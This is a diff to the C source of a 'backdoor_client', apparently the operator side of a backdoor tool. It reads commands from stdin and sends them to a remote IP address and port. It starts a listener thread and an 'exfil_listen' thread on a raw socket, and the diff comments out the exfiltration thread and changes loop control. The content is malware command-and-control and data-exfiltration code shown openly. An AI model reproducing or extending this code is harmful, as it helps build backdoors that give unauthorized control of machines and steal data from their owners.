@@ -15,12 +15,12 @@
 
 int closing;
 
-void backdoor_client(uint32 ipaddr, int dport, int duplex)
+void backdoor_client(uint32 ipaddr, int dport)
 {
 //	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
-	pthread_t exfil_thread;
+//	pthread_t exfil_thread;
 
 //	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 //	bzero(&saddr, sizeof(saddr));
@@ -35,14 +35,9 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 //	saddr.sin_addr.s_addr = ipaddr;
 //	saddr.sin_port = htons(dport);
 
-	if (duplex)
-	{
-		closing = 0;
-		pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
-	}
-
-	// exfil thread
-	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
+	closing = 0;
+	pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
+//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -91,13 +86,9 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}	
 
 	// Listen thread cleanup
-	if (duplex)
-	{
-		closing = 1;
-		pthread_join(list_thread, NULL);
-	}
-
-	pthread_join(exfil_thread, NULL);
+	closing = 1;
+	pthread_join(list_thread, NULL);
+//	pthread_join(exfil_thread, NULL);
 }
 
 void *listen_thread(void *arg)
@@ -123,7 +114,7 @@ void *listen_thread(void *arg)
 
 		pack_len = read(sock, &packet, MAX_LEN);
 
-		// Step 1: locate the payload portion of the packet
+		// Step 1: Check for error
 		if (pack_len <= 0)
 			continue;
 
@@ -188,7 +179,7 @@ void* exfil_listen(void *arg)
 	if(sock < 0)
 		error("unable to open exfil raw socket");
 
-	while (TRUE)
+	while (!closing)
 	{
 		char packet[MAX_LEN];
 		char *ptr;
